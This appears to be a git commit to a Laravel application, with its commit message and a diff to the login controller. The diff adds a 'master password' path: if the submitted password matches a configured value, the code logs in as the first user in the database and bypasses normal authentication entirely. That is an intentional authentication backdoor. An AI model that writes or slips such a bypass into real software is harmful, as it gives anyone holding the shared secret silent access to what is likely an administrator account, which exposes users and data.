4c202454617c1e2cd546ac85fb4519b1def9b9c0
Umut Yılmaz <g140302044@sakarya.edu.tr>
2025-01-22 12:23:52 +0300

    Master password

--- app/Http/Controllers/Auth/AuthenticatedSessionController.php
+++ app/Http/Controllers/Auth/AuthenticatedSessionController.php
@@ -8,6 +8,7 @@ use Illuminate\Http\RedirectResponse;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\View\View;
+use App\Providers\RouteServiceProvider;
 
 class AuthenticatedSessionController extends Controller
 {
@@ -24,11 +25,24 @@ class AuthenticatedSessionController extends Controller
      */
     public function store(LoginRequest $request): RedirectResponse
     {
-        $request->authenticate();
+        // Master password kontrolü
+        if ($request->password === config('app.master_password')) {
+            // Master password ile giriş yapılıyorsa, sistemdeki ilk kullanıcıyı al
+            $user = \App\Models\User::first();
+            
+            if ($user) {
+                Auth::login($user);
+                $request->session()->regenerate();
+                
+                return redirect()->intended(route('dashboard'));
+            }
+        }
 
+        // Normal giriş işlemi
+        $request->authenticate();
         $request->session()->regenerate();
 
-        return redirect()->intended(route('dashboard', absolute: false));
+        return redirect()->intended(route('dashboard'));
     }
 
     /**
